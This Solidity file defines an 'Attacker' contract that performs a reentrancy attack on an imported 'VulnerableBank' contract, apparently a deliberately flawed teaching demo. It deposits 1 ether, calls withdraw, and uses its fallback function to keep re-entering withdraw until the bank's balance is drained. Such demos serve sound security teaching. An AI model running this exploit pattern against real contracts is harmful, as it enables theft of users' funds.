// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./VulnerableBank.sol";

contract Attacker {
    VulnerableBank public vulnerableBank;

    constructor(address _vulnerableBankAddress)   {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
    }

    // Fallback function called when Ether is sent to this contract
    fallback() external payable {
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw();
        }
    }

    // Function to initiate the attack
    function attack() public payable {
        require(msg.value >= 1 ether, "Insufficient Ether for attack");

        // Deposit 1 Ether into the vulnerable contract
        vulnerableBank.deposit{value: 1 ether}();

        // Withdraw 1 Ether, triggering reentrancy
        vulnerableBank.withdraw();
    }
}